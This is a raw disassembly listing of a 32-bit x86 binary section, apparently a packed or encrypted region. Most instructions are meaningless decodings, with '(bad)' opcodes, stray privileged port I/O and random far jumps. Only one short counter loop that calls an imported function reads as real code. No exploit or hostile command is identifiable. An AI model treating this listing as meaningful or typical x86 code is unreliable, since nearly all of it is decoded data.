  411013:	mov    ds:0xcfc01ef1,al
  411018:	cmp    cl,cl
  41101a:	popf   
  41101b:	(bad)  
  41101c:	sub    BYTE PTR [edx-0x2adbe308],ah
  411022:	xchg   edx,eax
  411023:	addr16 (bad) 
  411025:	les    edi,FWORD PTR [eax]
  411027:	hlt    
  411028:	ja     0x410fca
  41102a:	clc    
  41102b:	xchg   ecx,eax
  41102c:	je     0x411016
  41102e:	inc    esi
  41102f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411030:	fadd   st(0),st
  411032:	js     0x41109d
  411034:	xor    al,0x1a
  411036:	mov    eax,0xd05ad3d
  41103b:	fbld   TBYTE PTR [edx]
  41103d:	pop    edx
  41103e:	mov    edx,0xd29cc2be
  411043:	rol    BYTE PTR [esi+ebx*8+0x6c613177],0x99
  41104b:	loope  0x4110aa
  41104d:	(bad)  
  41104e:	mov    ebx,0x87940963
  411053:	cmp    dl,BYTE PTR [edx-0x1b]
  411056:	ret    0xf760
  411059:	adc    cl,BYTE PTR [eax]
  41105b:	sbb    BYTE PTR [esi+0x3d],dl
  41105e:	sub    ebp,ecx
  411060:	mov    esp,edx
  411062:	ficomp DWORD PTR [edx-0x6291762e]
  411068:	ficom  DWORD PTR [ecx-0x713dfc36]
  41106e:	(bad)  [ecx+0x2fe770cd]
  411074:	push   es
  411075:	dec    edi
  411076:	cld    
  411077:	cmc    
  411078:	mov    ds:0xa58c9797,eax
  41107d:	mov    ch,0xeb
  41107f:	xchg   DWORD PTR [ebx],esp
  411081:	add    ecx,DWORD PTR [edx-0x2f77cfde]
  411087:	push   ds
  411088:	and    BYTE PTR [edi+0x5c],dl
  41108b:	(bad)  
  41108c:	shl    BYTE PTR [esi],1
  41108e:	xchg   edx,eax
  41108f:	mov    ds:0x398198b,eax
  411094:	test   DWORD PTR [edi+edi*4+0x1ba3e191],esi
  41109b:	in     al,dx
  41109c:	mov    ebp,0x5ea83789
  4110a1:	out    dx,eax
  4110a2:	test   eax,0x3808878b
  4110a7:	pop    edi
  4110a8:	xchg   esp,eax
  4110a9:	cli    
  4110aa:	inc    ebx
  4110ab:	push   0xa375ea2f
  4110b0:	scas   eax,DWORD PTR es:[edi]
  4110b1:	neg    BYTE PTR [ebp+0x18e30136]
  4110b7:	jo     0x41110c
  4110b9:	jae    0x41103e
  4110bb:	adc    ah,BYTE PTR [edx]
  4110bd:	in     eax,dx
  4110be:	mov    ah,0xa5
  4110c0:	sbb    ecx,eax
  4110c2:	mov    bh,0xc8
  4110c4:	in     al,dx
  4110c5:	mov    ch,0xeb
  4110c7:	adc    al,0x37
  4110c9:	inc    edx
  4110ca:	xor    eax,0x2833b028
  4110cf:	lds    esi,FWORD PTR [edi-0x15]
  4110d2:	sbb    DWORD PTR [esi+ecx*4+0x3c],esp
  4110d6:	div    BYTE PTR [edx]
  4110d8:	jae    0x411110
  4110da:	leave  
  4110db:	rcl    edi,1
  4110dd:	iret   
  4110de:	mov    edi,0x35ffcd2a
  4110e3:	imul   edx,DWORD PTR [edx+0x68843c3d],0xe1fb9b25
  4110ed:	out    0xb7,al
  4110ef:	sub    al,0xe6
  4110f1:	sbb    al,0xb4
  4110f3:	xchg   esp,eax
  4110f4:	cmp    al,0xdc
  4110f6:	test   BYTE PTR [ebp+0x2c64d8a1],0xd9
  4110fd:	out    0x9b,al
  4110ff:	push   ecx
  411100:	pop    ebp
  411101:	jno    0x4110de
  411103:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411104:	mov    DWORD PTR [ebx+ecx*2],edi
  411107:	add    ch,BYTE PTR [eax-0x54]
  41110a:	add    al,0x61
  41110c:	bound  eax,QWORD PTR ds:0xd5e2743f
  411112:	add    BYTE PTR [edi+0x2c],cl
  411115:	cmp    al,0x6b
  411117:	sub    BYTE PTR [esi],dl
  411119:	xor    DWORD PTR [ecx],esp
  41111b:	test   eax,0x97bc0d4f
  411120:	in     al,dx
  411121:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411122:	(bad)  [ecx-0x32923c84]
  411128:	sbb    DWORD PTR [ecx-0x3dcbdfc3],0xffffffbe
  41112f:	jmp    0xf8e6:0x26b942a5
  411136:	imul   edx,DWORD PTR [eax],0x40
  411139:	fs cmp al,0xe5
  41113c:	pop    ss
  41113d:	mov    ebx,0x1ae2daa3
  411142:	int3   
  411143:	fistp  QWORD PTR [edx]
  411145:	clts   
  411147:	sub    ah,BYTE PTR [edi-0x138d53ed]
  41114d:	(bad)  
  41114e:	jl     0x41115f
  411150:	push   ecx
  411151:	into   
  411152:	mov    ebx,0x6253cf86
  411157:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411158:	or     eax,0xe0261d6b
  41115d:	cmp    BYTE PTR [esi+0x380d75f],cl
  411163:	mov    dl,0x2b
  411165:	dec    eax
  411166:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411167:	outs   dx,DWORD PTR ds:[esi]
  411168:	or     al,0x8a
  41116a:	popa   
  41116b:	scas   eax,DWORD PTR es:[edi]
  41116c:	and    cl,ch
  41116e:	jo     0x4111e9
  411170:	call   DWORD PTR [ebp-0x3e]
  411173:	mov    esp,?
  411175:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411176:	mov    BYTE PTR [esi],ah
  411178:	enter  0x79e6,0x7a
  41117c:	xor    DWORD PTR [ebx],edx
  41117e:	xchg   ecx,esp
  411180:	icebp  
  411181:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411182:	push   0x53291804
  411187:	stc    
  411188:	mov    dl,0x98
  41118a:	ja     0x4111fc
  41118c:	and    BYTE PTR [ebx-0x59],ah
  41118f:	sub    al,0x30
  411191:	mov    bh,0x5d
  411193:	scas   eax,DWORD PTR es:[edi]
  411194:	xchg   edx,eax
  411195:	jo     0x4111fa
  411197:	sub    cl,BYTE PTR [ebp+0xa6c253c]
  41119d:	and    esp,DWORD PTR [ecx+0x8]
  4111a0:	push   ebx
  4111a1:	in     al,dx
  4111a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111a3:	ror    DWORD PTR [ebp-0x643d8ad1],0x18
  4111aa:	addr16 mov ds:0x779c,al
  4111ae:	cmp    BYTE PTR [esi+0x53],ah
  4111b1:	mov    dl,0x15
  4111b3:	mov    ebx,0x3d1e2ffa
  4111b8:	in     eax,dx
  4111b9:	jmp    0x4111b3
  4111bb:	(bad)  
  4111bc:	ffree  st(3)
  4111be:	rcr    ebp,1
  4111c0:	fsub   QWORD PTR [eax-0x15]
  4111c3:	dec    esp
  4111c4:	mov    cs,WORD PTR [eax+0x1c4464b]
  4111ca:	mov    ds:0x12285d63,eax
  4111cf:	into   
  4111d0:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4111d2:	outs   dx,DWORD PTR ds:[esi]
  4111d3:	push   edx
  4111d4:	mov    eax,ds:0xc42de2d6
  4111d9:	adc    ch,BYTE PTR [ecx+ebx*4-0x11eadf37]
  4111e0:	and    esi,DWORD PTR ds:0x301cb0d2
  4111e6:	or     al,0x55
  4111e8:	mov    ah,0x97
  4111ea:	xor    al,0xfa
  4111ec:	in     al,dx
  4111ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111ee:	je     0x411268
  4111f0:	mul    eax
  4111f2:	aaa    
  4111f3:	out    dx,eax
  4111f4:	cmp    BYTE PTR [ecx+0xb],cl
  4111f7:	add    dl,BYTE PTR [ecx-0x7249881e]
  4111fd:	and    ebx,ebx
  4111ff:	and    dh,BYTE PTR [esi+0x5707d2f7]
  411205:	pop    eax
  411206:	ja     0x411248
  411208:	lods   eax,DWORD PTR ds:[esi]
  411209:	imul   esi,DWORD PTR [edi+0x9],0x19bec9a0
  411210:	test   eax,0x4a216afd
  411215:	mov    ecx,0x1cd76d92
  41121a:	outs   dx,DWORD PTR ds:[esi]
  41121b:	mov    bl,0xb3
  41121d:	test   BYTE PTR [edi-0x59d38cce],cl
  411223:	dec    esi
  411224:	adc    BYTE PTR [ecx-0x241b7395],ah
  41122a:	jl     0x411268
  41122c:	inc    ecx
  41122d:	in     al,0xf2
  41122f:	mov    ds:0x4f769ac8,al
  411234:	cmp    DWORD PTR [edi],edx
  411236:	push   ds
  411237:	aam    0x34
  411239:	lea    ebx,[edi+edx*8+0x760029d1]
  411240:	cmp    al,0x98
  411242:	jle    0x4112a9
  411244:	das    
  411245:	into   
  411246:	shl    BYTE PTR [ebp-0x19],0x83
  41124a:	jl     0x411233
  41124c:	loop   0x411258
  41124e:	cwde   
  41124f:	pop    DWORD PTR [eax]
  411251:	xor    dl,BYTE PTR [esi]
  411253:	(bad)  
  411254:	jle    0x41129e
  411256:	xlat   BYTE PTR ds:[ebx]
  411257:	gs (bad) 
  411259:	shr    bh,cl
  41125b:	lods   eax,DWORD PTR ds:[esi]
  41125c:	fdivr  st(2),st
  41125e:	mov    ebx,0x8b161be4
  411263:	xchg   esp,eax
  411264:	or     dl,ch
  411266:	add    al,0x4a
  411268:	inc    edi
  411269:	inc    ebp
  41126a:	inc    ebx
  41126b:	push   ebp
  41126c:	jno    0x4112ec
  41126e:	test   ecx,ebx
  411270:	mov    DWORD PTR [ebp+0x4f5ea0cb],ecx
  411276:	repz or cl,BYTE PTR [edx+0x1b4f01e1]
  41127d:	mov    al,cs:0xbe40c64f
  411283:	pop    ebx
  411284:	jb     0x4112e5
  411286:	test   eax,edx
  411288:	and    ch,BYTE PTR gs:[ebx+0x2e]
  41128c:	jbe    0x41128c
  41128e:	sti    
  41128f:	xchg   ebx,eax
  411290:	lea    esp,fs:[eax*2-0x3881235f]
  411298:	fisttp WORD PTR [ecx]
  41129a:	stos   BYTE PTR es:[edi],al
  41129b:	xor    dl,BYTE PTR [esi]
  41129d:	mov    ebp,0xf1b84d54
  4112a2:	rcl    BYTE PTR [ebx-0x4],0xfb
  4112a6:	xchg   edx,eax
  4112a7:	scas   eax,DWORD PTR es:[edi]
  4112a8:	cmp    bl,bh
  4112aa:	mov    ecx,DWORD PTR [ecx]
  4112ac:	and    BYTE PTR [edi+0x16e70830],bl
  4112b2:	xchg   ecx,eax
  4112b3:	(bad)  ds:0x84845d9a
  4112b9:	sbb    eax,0x8c930616
  4112be:	sahf   
  4112bf:	test   DWORD PTR [ecx-0x41fe38e0],esi
  4112c5:	mov    ds:0x2311d139,al
  4112ca:	mov    ds:0x198ebc99,al
  4112cf:	or     al,0xbf
  4112d1:	inc    esi
  4112d2:	stc    
  4112d3:	fadd   st(1),st
  4112d5:	dec    edx
  4112d6:	outs   dx,DWORD PTR ds:[esi]
  4112d7:	mov    DWORD PTR [esi],ecx
  4112d9:	std    
  4112da:	and    dl,dh
  4112dc:	je     0x411275
  4112de:	sub    BYTE PTR [esi],dh
  4112e0:	repnz outs dx,BYTE PTR ds:[esi]
  4112e2:	push   es
  4112e3:	scas   eax,DWORD PTR es:[edi]
  4112e4:	or     esi,DWORD PTR [edi-0x31bdd552]
  4112ea:	or     dl,dh
  4112ec:	inc    eax
  4112ed:	push   ecx
  4112ee:	pop    esp
  4112ef:	xchg   edi,eax
  4112f0:	test   DWORD PTR [eax-0x4b33d991],edx
  4112f6:	xor    eax,DWORD PTR [edi-0x59]
  4112f9:	fist   WORD PTR [edx+0x3b456ca9]
  4112ff:	jg     0x411332
  411301:	jae    0x41135e
  411303:	add    esi,DWORD PTR [esp+edx*2-0x1999ce8f]
  41130a:	jno    0x4112eb
  41130c:	test   DWORD PTR [edx-0x4a],edi
  41130f:	lahf   
  411310:	jmp    0x411302
  411312:	out    0xcf,al
  411314:	xor    DWORD PTR [ebx],edi
  411316:	aad    0x98
  411318:	(bad)  
  411319:	bound  esi,QWORD PTR [ebx]
  41131b:	mov    dl,0xf4
  41131d:	xchg   ecx,eax
  41131e:	repnz pusha 
  411320:	cmp    eax,0x41a469b0
  411325:	repz scas eax,DWORD PTR es:[edi]
  411327:	mov    eax,eax
  411329:	push   ebp
  41132a:	out    dx,eax
  41132b:	adc    al,0x15
  41132d:	inc    eax
  41132e:	add    dl,BYTE PTR [edi]
  411330:	test   DWORD PTR [ebp+0x70],esi
  411333:	add    ah,BYTE PTR [eax+0x405f10d4]
  411339:	or     al,0xbb
  41133b:	scas   eax,DWORD PTR es:[edi]
  41133c:	out    0x3d,al
  41133e:	sbb    eax,0x10066c39
  411343:	mov    ch,bh
  411345:	jmp    0x41131a
  411347:	jno    0x4112f3
  411349:	test   BYTE PTR [ecx],ah
  41134b:	sub    DWORD PTR [esi-0x30],0xffffff9c
  41134f:	mov    bl,0x49
  411351:	arpl   dx,sp
  411353:	push   es
  411354:	pop    ss
  411355:	cwde   
  411356:	jnp    0x41134f
  411358:	sahf   
  411359:	xor    ebp,DWORD PTR [ebx]
  41135b:	std    
  41135c:	sub    al,0x74
  41135e:	(bad)  
  41135f:	cmp    al,BYTE PTR [ebp+eax*8+0x69274a5]
  411366:	out    0x80,eax
  411368:	mov    ebx,DWORD PTR [ebp+0x67063173]
  41136e:	xchg   BYTE PTR [esi+0x8277ec2],ah
  411374:	pop    edx
  411375:	push   esp
  411376:	popf   
  411377:	xlat   BYTE PTR ds:[ebx]
  411378:	jne    0x411346
  41137a:	cmp    ch,dl
  41137c:	mov    WORD PTR [edx+edi*1+0x35cbff4f],gs
  411383:	sub    al,0xdc
  411385:	adc    BYTE PTR [ebp-0x6302a361],ah
  41138b:	outs   dx,BYTE PTR fs:[esi]
  41138d:	jnp    0x411350
  41138f:	mov    esp,0xea0b14d1
  411394:	outs   dx,DWORD PTR ds:[esi]
  411395:	jne    0x4113f8
  411397:	pusha  
  411398:	xchg   esp,eax
  411399:	jecxz  0x4113d5
  41139b:	cmc    
  41139c:	mov    eax,ds:0xd3dadbba
  4113a1:	enter  0x4d6b,0x3
  4113a5:	mov    dl,0x45
  4113a7:	push   es
  4113a8:	popf   
  4113a9:	lock inc ebx
  4113ab:	mov    al,0x93
  4113ad:	xchg   edx,eax
  4113ae:	out    dx,eax
  4113af:	sbb    DWORD PTR [ebx+0x2c],ecx
  4113b2:	jmp    0x8a4c:0x374fa148
  4113b9:	gs pop esp
  4113bb:	mov    ch,0x3a
  4113bd:	mov    dl,0x5a
  4113bf:	add    edx,edi
  4113c1:	mov    ch,0xc1
  4113c3:	mov    bl,0x3b
  4113c5:	mov    bh,0x5
  4113c8:	icebp  
  4113c9:	std    
  4113ca:	inc    edx
  4113cb:	add    ah,ah
  4113cd:	js     0x4113cf
  4113cf:	add    BYTE PTR [edi],cl
  4113d1:	test   ah,al
  4113d3:	or     BYTE PTR [eax],al
  4113d5:	add    BYTE PTR [ecx+0x41b224],ah
  4113db:	and    DWORD PTR ds:0x42fe7a,0x0
  4113e5:	mov    esi,DWORD PTR ds:0x42fe7a
  4113eb:	inc    esi
  4113ec:	mov    DWORD PTR ds:0x42fe7a,esi
  4113f2:	cmp    DWORD PTR ds:0x42fe7a,0x8
  4113f9:	jne    0x41140f
  4113ff:	push   0x42e2e7
  411404:	push   0x42e36d
  411409:	call   DWORD PTR ds:0x42e667
  41140f:	cmp    DWORD PTR ds:0x42fe7a,0x7
  411416:	jne    0x411429
  41141c:	mov    esi,DWORD PTR ds:0x42fe7a
  411422:	inc    esi
  411423:	mov    DWORD PTR ds:0x42fe7a,esi
  411429:	cmp    DWORD PTR ds:0x42fe7a,0x13
  411430:	jb     0x4113e5
  411436:	jmp    0x41183b
  41143b:	and    cl,al
  41143d:	leave  
  41143e:	adc    ch,cl
  411440:	adc    ecx,esp
  411442:	call   0xcb53bead
  411447:	fdivr  QWORD PTR [ebx+eax*2+0x704a0e67]
  41144e:	jo     0x4114a8
  411450:	jge    0x4114c2
  411452:	jo     0x4114cd
  411454:	in     eax,dx
  411455:	sti    
  411456:	push   0xffffffa3
  411458:	jge    0x4114a2
  41145a:	ins    DWORD PTR es:[edi],dx
  41145b:	add    eax,0x3300e5d1
  411460:	dec    edx
  411461:	(bad)  
  411462:	jae    0x51eeaff6
  411468:	mov    dl,BYTE PTR [edx-0x504bc51e]
  41146e:	rcl    DWORD PTR [ebx],1
  411470:	push   0xd5aefd59
  411475:	adc    DWORD PTR [ecx-0x9],esp
  411478:	lods   al,BYTE PTR ds:[esi]
  411479:	mov    BYTE PTR [ecx],cl
  41147b:	es jge 0x411451
  41147e:	test   DWORD PTR [ebx],0xb9cd5bb5
  411484:	lds    eax,FWORD PTR [eax+0x4f811c8d]
  41148a:	sbb    DWORD PTR [edx+0x33],ebx
  41148d:	fnstcw WORD PTR [esi+0xd]
  411490:	dec    edi
  411491:	jmp    0x703f:0xc50a175b
  411498:	inc    esi
  411499:	adc    esp,ebx
  41149b:	aad    0xc4
  41149d:	cmp    DWORD PTR [ebp-0x79],edi
  4114a0:	(bad)  
  4114a2:	bound  edi,QWORD PTR [edi-0x64]
  4114a5:	mov    ch,ah
  4114a7:	sbb    esi,DWORD PTR [eax+0x4a7b0f1c]
  4114ad:	push   es
  4114ae:	sbb    ch,al
  4114b0:	pop    edx
  4114b1:	stos   DWORD PTR es:[edi],eax
  4114b2:	add    ch,ah
  4114b4:	xchg   ebx,eax
  4114b5:	popf   
  4114b6:	pop    esp
  4114b7:	xor    BYTE PTR [eax],al
  4114b9:	mov    ch,0xa0
  4114bb:	addr16 inc esp
  4114bd:	jp     0x4114ca
  4114bf:	xor    eax,0xf97e88a2
  4114c4:	aam    0xa7
  4114c6:	fst    DWORD PTR [edi]
  4114c8:	mov    edi,0xf9f9de44
  4114cd:	xor    DWORD PTR [ecx*4+0x4bb1bf1a],esp
  4114d4:	fisubr WORD PTR [edx+0x5e927bde]
  4114da:	adc    eax,0x6853127c
  4114df:	leave  
  4114e0:	pusha  
  4114e1:	push   ebp
  4114e2:	and    esp,eax
  4114e4:	pop    es
  4114e5:	call   0x9ce1b8f1
  4114ea:	ins    BYTE PTR es:[edi],dx
  4114eb:	(bad)
  4114ee:	pop    ss
  4114ef:	int    0x45
  4114f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114f2:	adc    al,0x49
  4114f4:	in     al,dx
  4114f5:	pop    esp
  4114f6:	aad    0x3b
  4114f8:	retf   0x9174
  4114fb:	fs mov al,0xb0
  4114fe:	cwde   
  4114ff:	and    ch,bh
  411501:	cmp    bl,BYTE PTR [esi]
  411503:	adc    eax,0xa97ea6ff
  411508:	jnp    0x4114ab
  41150a:	std    
  41150b:	xor    BYTE PTR [ebx+ebx*2],cl
  41150e:	inc    esp
  41150f:	mov    ebp,0x5c5e0184
  411514:	or     al,0x2e
  411516:	stos   DWORD PTR es:[edi],eax
  411517:	nop
  411518:	stos   BYTE PTR es:[edi],al
  411519:	ds cmp DWORD PTR cs:[esi],0xffffffb1
  41151e:	inc    esi
  41151f:	aas    
  411520:	jnp    0x4114d2
  411522:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411523:	test   al,0xa3
  411525:	repnz test eax,0x11430e2d
  41152b:	repz mov ds:0x8157a1b1,eax
  411531:	dec    ecx
  411532:	mov    esi,ebp
  411534:	push   eax
  411535:	mov    al,0x3f
  411537:	or     DWORD PTR [ecx+eax*2-0x1f],eax
  41153b:	mov    edx,0x85dd80d9
  411540:	das    
  411541:	pop    esp
  411542:	adc    bh,0x47
  411545:	popf   
  411546:	xchg   edx,eax
  411547:	or     dh,BYTE PTR [eax]
  411549:	xor    eax,0x196740ad
  41154e:	jno    0x41150b
  411550:	push   ds
  411551:	dec    esi
  411552:	inc    esp
  411553:	in     al,dx
  411554:	(bad)  
  411555:	xor    al,0xa5
  411557:	jmp    0x42aa6210
  41155c:	jp     0x4115c7
  41155e:	int3   
  41155f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411560:	ja     0x41155b
  411562:	ja     0x41156e
  411564:	mov    gs,WORD PTR [edi+ecx*8-0x304d700e]
  41156b:	push   0xffffffbb
  41156d:	xor    ebp,DWORD PTR [edi+0x6c]
  411570:	mov    eax,ds:0x87e007e5
  411575:	repnz leave 
  411577:	mov    eax,0x387578b9
  41157c:	push   ss
  41157d:	inc    ebp
  41157e:	and    BYTE PTR [eax-0x260c0da5],0xbc
  411585:	ss pushf 
  411587:	ss jno 0x41150c
  41158a:	dec    edx
  41158b:	mov    dl,0x46
  41158d:	stos   DWORD PTR es:[edi],eax
  41158e:	or     edi,DWORD PTR [ebp-0x22]
  411591:	jnp    0x4115e9
  411593:	or     cl,cl
  411595:	ror    BYTE PTR ds:0x325cf245,0xcf
  41159c:	in     al,dx
  41159d:	mov    ch,0x7e
  41159f:	dec    ebx
  4115a0:	sub    dh,BYTE PTR [ecx+0x16]
  4115a3:	dec    edx
  4115a4:	and    eax,0x185fbcb6
  4115a9:	(bad)  
  4115aa:	cdq    
  4115ab:	mov    ah,0x27
  4115ad:	pop    ss
  4115ae:	int3   
  4115af:	or     BYTE PTR [ebp+0x9],bh
  4115b2:	xchg   esi,eax
  4115b3:	out    dx,eax
  4115b4:	(bad)  
  4115b5:	out    0xba,al
  4115b7:	ins    DWORD PTR es:[edi],dx
  4115b8:	in     eax,dx
  4115b9:	aas    
  4115ba:	push   ecx
  4115bb:	fistp  QWORD PTR [ebp+0x57]
  4115be:	xor    BYTE PTR [ebp-0x7ebcc3c0],0x11
  4115c5:	mov    ch,0x64
  4115c7:	call   0x756b:0x42c7d799
  4115ce:	sub    al,0x16
  4115d0:	sub    ebx,ebx
  4115d2:	push   ebx
  4115d3:	adc    DWORD PTR [ebp+0x27824f6f],edi
  4115d9:	and    edx,DWORD PTR [edi]
  4115db:	out    dx,eax
  4115dc:	xchg   DWORD PTR [edi],edx
  4115de:	ja     0x411622
  4115e0:	inc    esi
  4115e1:	aas    
  4115e2:	push   ecx
  4115e3:	pop    ds
  4115e4:	in     al,dx
  4115e5:	leave  
  4115e6:	pop    ebx
  4115e7:	mov    ch,0x6c
  4115e9:	push   esp
  4115ea:	jo     0x411579
  4115ec:	mov    al,ds:0xb19ad967
  4115f1:	push   ebx
  4115f2:	add    esp,DWORD PTR [ebx]
  4115f4:	dec    ecx
  4115f5:	mov    al,dh
  4115f7:	int    0x9a
  4115f9:	sub    cl,BYTE PTR [eax-0x8]
  4115fc:	and    DWORD PTR [esi+0x5],0x791bf9bd
  411603:	push   0xffffffd3
  411605:	hlt    
  411606:	and    cl,cl
  411608:	pop    esi
  411609:	jbe    0x41158d
  41160b:	pop    ds
  41160c:	fiadd  WORD PTR [ecx]
  41160e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41160f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411610:	and    DWORD PTR [esi+edi*1],ebp
  411613:	adc    DWORD PTR [ecx],0xec97edef
  411619:	cmc    
  41161a:	call   0xafe6:0x7eb5a629
  411621:	and    BYTE PTR [edx-0x59e32bff],cl
  411627:	jecxz  0x4115df
  411629:	cdq    
  41162a:	div    BYTE PTR [ebp+esi*1-0x514b3d6e]
  411631:	stc    
  411632:	sbb    bh,bh
  411634:	les    edx,FWORD PTR [ecx]
  411636:	aam    0x4f
  411638:	push   edx
  411639:	mov    ecx,0x7fbb4420
  41163e:	sbb    ecx,DWORD PTR ss:[esi-0x54700772]
  411645:	dec    ebx
  411646:	push   edx
  411647:	xchg   cx,ax
  411649:	jp     0x411634
  41164b:	push   edi
  41164c:	shl    bh,1
  41164e:	xchg   DWORD PTR [ebx],ebp
  411650:	xor    eax,edi
  411652:	inc    ebp
  411653:	mov    eax,0xb35ab612
  411658:	mov    ch,0x9b
  41165a:	xchg   edx,eax
  41165b:	scas   al,BYTE PTR es:[edi]
  41165c:	js     0x41168e
  41165e:	sub    ah,cl
  411660:	inc    esp
  411661:	jae    0x4115f6
  411663:	enter  0x6bf9,0x5f
  411667:	das    
  411668:	sar    ecx,1
  41166a:	xchg   edi,eax
  41166b:	sub    BYTE PTR [esi-0x49b3ad94],cl
  411671:	jmp    0xe2c61d22
  411676:	inc    esp
  411677:	mov    eax,ds:0x6bbb38e0
  41167c:	in     eax,dx
  41167d:	dec    ebp
  41167e:	xchg   cx,ax
  411680:	inc    edx
  411681:	pop    esi
  411682:	jne    0x4116b4
  411684:	arpl   WORD PTR [ecx+0x56],cx
  411687:	test   BYTE PTR [eax],0x7a
  41168a:	das    
  41168b:	push   ebx
  41168c:	and    esp,DWORD PTR [esi+0x29]
  41168f:	mov    edi,0x6659838d
  411694:	jge    0x411687
  411696:	push   ecx
  411697:	out    0x51,eax
  411699:	lods   eax,DWORD PTR ds:[esi]
  41169a:	or     ah,BYTE PTR [eax]
  41169c:	stc    
  41169d:	xchg   bl,bl
  41169f:	push   ebp
  4116a0:	adc    al,0x9
  4116a2:	or     esp,DWORD PTR [ebp+0x20]
  4116a5:	xchg   ecx,eax
  4116a6:	(bad)  
  4116a7:	mov    esi,0x148690f5
  4116ac:	jno    0x411729
  4116ae:	sahf   
  4116af:	inc    ebp
  4116b0:	into   
  4116b1:	lods   al,BYTE PTR ds:[esi]
  4116b2:	and    al,0xb9
  4116b4:	test   al,0xcb
  4116b6:	push   ss
  4116b7:	jmp    0xe6399365
  4116bc:	or     eax,0x236f9e59
  4116c1:	push   0xffffffbe
  4116c3:	ret    0xdab1
  4116c6:	mov    al,ds:0xb8f46da9
  4116cb:	(bad)  
  4116cc:	in     al,dx
  4116cd:	pinsrw mm3,WORD PTR [esi-0x18a17439],0x92
  4116d5:	lods   eax,DWORD PTR ds:[esi]
  4116d6:	sbb    BYTE PTR [ecx+0x70],0x18
  4116da:	cli    
  4116db:	aam    0x8
  4116dd:	stc    
  4116de:	cmp    eax,DWORD PTR [edx+0x39fbf4ea]
  4116e4:	imul   edi,DWORD PTR [edx-0x46],0xffffffe2
  4116e8:	ins    BYTE PTR es:[edi],dx
  4116e9:	in     al,0x92
  4116eb:	cmp    al,0xd9
  4116ed:	shl    al,1
  4116ef:	xor    eax,0x9ba77d14
  4116f4:	arpl   WORD PTR [eax+edi*1-0x77d06039],di
  4116fb:	sahf   
  4116fc:	jo     0x411705
  4116fe:	xchg   ebp,eax
  4116ff:	in     eax,dx
  411700:	ja     0x4116c1
  411702:	loope  0x4116bf
  411704:	xor    BYTE PTR [eax-0x180192f],dl
  41170a:	mov    eax,0xbccd6950
  41170f:	loopne 0x411785
  411711:	dec    edx
  411712:	cdq    
  411713:	clts   
  411715:	xchg   ebp,eax
  411716:	aad    0x6a
  411718:	imul   edi,DWORD PTR [esi-0x1789472],0xd
  41171f:	(bad)  
  411720:	xor    al,BYTE PTR [eax+0x2d3ee3f6]
  411726:	push   esi
  411727:	ins    BYTE PTR es:[edi],dx
  411728:	loopne 0x411765
  41172a:	call   0xc8e9:0xbdc90cac
  411731:	dec    ebp
  411732:	in     al,dx
  411733:	jne    0x4116d1
  411735:	add    esp,DWORD PTR [ebx+ebp*1-0x7cd5f738]
  41173c:	(bad)  
  41173d:	xor    ebx,DWORD PTR [ebp+ebx*2-0x31]
  411741:	cld    
  411742:	pop    ecx
  411743:	pop    ebp
  411744:	in     al,dx
  411745:	leave  
  411746:	scas   al,BYTE PTR es:[edi]
  411747:	rcr    bh,1
  411749:	sbb    eax,0x4310b9e3
  41174e:	scas   al,BYTE PTR es:[edi]
  41174f:	push   es
  411750:	push   0x9f3f2ccc
  411755:	shl    BYTE PTR [ecx+0x84cc18a],1
  41175b:	mov    dl,0xc8
  41175d:	inc    eax
  41175e:	pop    ss
  41175f:	jae    0x41175c
  411761:	xor    DWORD PTR [edi-0x69ad5482],edx
  411767:	sub    al,0x2a
  411769:	sub    BYTE PTR [ebx],dl
  41176b:	in     al,0x93
  41176d:	dec    eax
  41176e:	(bad)  
  41176f:	sub    ah,BYTE PTR [ebx-0x7e46df41]
  411775:	stc    
  411776:	jo     0x411708
  411778:	mov    ch,0xea
  41177a:	pop    eax
  41177b:	jnp    0x411779
  41177d:	ins    DWORD PTR es:[edi],dx
  41177e:	leave  
  41177f:	xchg   edi,eax
  411780:	mov    bl,0xf9
  411782:	shl    DWORD PTR [edi],cl
  411784:	dec    eax
  411785:	mov    cl,0x66
  411787:	fisub  WORD PTR [edx]
  411789:	xchg   ecx,eax
  41178a:	inc    ebp
  41178b:	xchg   BYTE PTR [ebp+0x79f9fc49],dl
  411791:	ds dec si
  411794:	into   
  411795:	inc    eax
  411796:	fucomi st,st(3)
  411798:	cmp    ebx,DWORD PTR [esi-0x15]
  41179b:	lock popf 
  41179d:	out    0x1f,al
  41179f:	es jl  0x411749
  4117a2:	mov    esp,0xc2df70ee
  4117a7:	sbb    ebp,DWORD PTR [edx]
  4117a9:	xor    al,0x13
  4117ab:	shl    BYTE PTR [esi+0x5aedd6c0],cl
  4117b1:	ds pop ds
  4117b3:	ret    0xbaf4
  4117b6:	call   0xa78a:0x251c8fa3
  4117bd:	aam    0x12
  4117bf:	aad    0xbb
  4117c1:	jnp    0x4117e5
  4117c3:	mov    cl,0xf7
  4117c5:	push   eax
  4117c6:	fstp   TBYTE PTR [edx+0x6]
  4117c9:	mov    dh,0x7b
  4117cb:	mov    edx,0xb896f90b
  4117d0:	pusha  
  4117d1:	push   ss
  4117d2:	adc    edx,DWORD PTR [edx]
  4117d4:	arpl   WORD PTR [ecx+0x62],dx
  4117d7:	fnsave [ecx+0x26]
  4117da:	popa   
  4117db:	lods   al,BYTE PTR ds:[esi]
  4117dc:	pop    ss
  4117dd:	xchg   ch,bh
  4117df:	lds    ebx,FWORD PTR [ecx-0x7e]
  4117e2:	aaa    
  4117e3:	jl     0x411848
  4117e5:	inc    ebx
  4117e6:	call   0xa3a37719
  4117eb:	aas    
  4117ec:	add    dh,BYTE PTR [eax+0xe2e8929]
  4117f2:	xor    eax,0x11c3da49
  4117f7:	in     eax,0x9f
  4117f9:	sti    
  4117fa:	mov    esi,0x5ab6c552
